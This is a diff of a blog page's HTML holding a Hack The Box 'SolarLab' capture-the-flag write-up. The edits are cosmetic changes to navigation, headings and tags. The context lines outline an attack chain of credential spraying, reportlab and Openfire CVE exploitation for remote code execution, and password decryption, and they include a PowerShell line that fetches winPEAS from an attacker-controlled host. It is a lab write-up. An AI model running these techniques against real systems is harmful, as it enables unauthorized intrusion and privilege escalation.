@@ -89,12 +89,6 @@
 		  </li>
 		  
 		  <li>
-			<a href="/categories" title="All the categories.">
-			  <i class="fa fa-folder"></i>Categories
-			</a>
-		  </li>
-		  
-		  <li>
 			<a href="/tags" title="All the tags.">
 			  <i class="fa fa-tags"></i>Tags
 			</a>
@@ -102,7 +96,7 @@
 		  
 		  <li>
 			<a href="/about" title="About me.">
-			  <i class="fa fa-user"></i>About
+			  <i class="fa fa-user"></i>About Me
 			</a>
 		  </li>
 		  
@@ -141,7 +135,7 @@
 	  		
 
 	  <p><img src="/../images/solarlab/blacksolar.png" alt="SolarLab HTB machine banner "></p>
-<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>SolarLab begins with an SMB share containing a spreadsheet of usernames and passwords. By exploiting a website that displays distinct error messages for incorrect usernames versus wrong passwords, combined with analyzing the username format, I was able to identify valid credentials.</p>
+<h1 id="Overview"><a href="#Overview" class="headerlink" title="_Overview"></a>_Overview</h1><p>SolarLab begins with an SMB share containing a spreadsheet of usernames and passwords. By exploiting a website that displays distinct error messages for incorrect usernames versus wrong passwords, combined with analyzing the username format, I was able to identify valid credentials.</p>
 <p> Once logged in, I leveraged CVE-2023-33733 in the reportlab PDF generation process to achieve Remote Code Execution (RCE) and obtain a shell.</p>
 <p>For lateral movement,  to escalate privileges to the openfire user,  method takes advantage of CVE-2023-32315 in OpenFire to create a user and upload a malicious plugin for RCE.<br> With this access, I decrypted a password from the OpenFire configuration, which  served as the administrator’s password. </p>
  <span id="more"></span>
@@ -222,7 +216,7 @@
 <p>Uploadingwinpeas</p>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wget</span> <span class="string">&quot;http://10.10.16.97/winPEASany.exe&quot;</span> <span class="literal">-OutFile</span> </span><br><span class="line"><span class="string">&quot;C:\Users\blake\Desktop\winpeas.exe&quot;</span></span><br></pre></td></tr></table></figure>
 <p>Found openfire service Running running a web protal locally on port 9090.<br><img src="/../images/solarlab/listneingport.png" alt="Netstat output showing Openfire service listening on port 9090"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Openfire(Openfire)[&quot;C:\Program Files\Openfire\bin\openfire-service.exe&quot;] - Autoload</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Openfire(Openfire)[<span class="string">&quot;C:\Program Files\Openfire\bin\openfire-service.exe&quot;</span>] - Autoload</span><br></pre></td></tr></table></figure>
 
 <h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>Openfire is a real-time collaboration (RTC) server licensed under the Open Source Apache License.<br>I tried to get into <code>C:\Program Files\Openfire\</code> to look for scripts&#x2F;DBs but it was resricted to openfire only.</p>
 <h3 id="Openfire-Web-Server"><a href="#Openfire-Web-Server" class="headerlink" title="Openfire Web Server"></a>Openfire Web Server</h3><p>port forwarding with chisel so i can interact with local server:</p>
@@ -328,7 +322,7 @@
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/windows/">windows<span>2</span></a></li> <li><a href="/tags/Writeup/">Writeup<span>1</span></a></li> <li><a href="/tags/nmap/">nmap<span>1</span></a></li> <li><a href="/tags/HTB/">HTB<span>1</span></a></li> <li><a href="/tags/smb/">smb<span>1</span></a></li> <li><a href="/tags/flask/">flask<span>1</span></a></li> <li><a href="/tags/privilege-escalation/">privilege escalation<span>2</span></a></li> <li><a href="/tags/openfire/">openfire<span>1</span></a></li> <li><a href="/tags/chisel/">chisel<span>1</span></a></li> <li><a href="/tags/password-spray/">password-spray<span>1</span></a></li> <li><a href="/tags/htb-solarlab/">htb solarlab<span>1</span></a></li>
+  <li><a href="/tags/Writeup/">Writeup<span>1</span></a></li> <li><a href="/tags/nmap/">nmap<span>1</span></a></li> <li><a href="/tags/HTB/">HTB<span>1</span></a></li> <li><a href="/tags/smb/">smb<span>1</span></a></li> <li><a href="/tags/windows/">windows<span>1</span></a></li> <li><a href="/tags/flask/">flask<span>1</span></a></li> <li><a href="/tags/privilege-escalation/">privilege escalation<span>2</span></a></li> <li><a href="/tags/openfire/">openfire<span>1</span></a></li> <li><a href="/tags/chisel/">chisel<span>1</span></a></li> <li><a href="/tags/password-spray/">password-spray<span>1</span></a></li> <li><a href="/tags/htb-solarlab/">htb solarlab<span>1</span></a></li>
     </ul>
 	</div>
 		
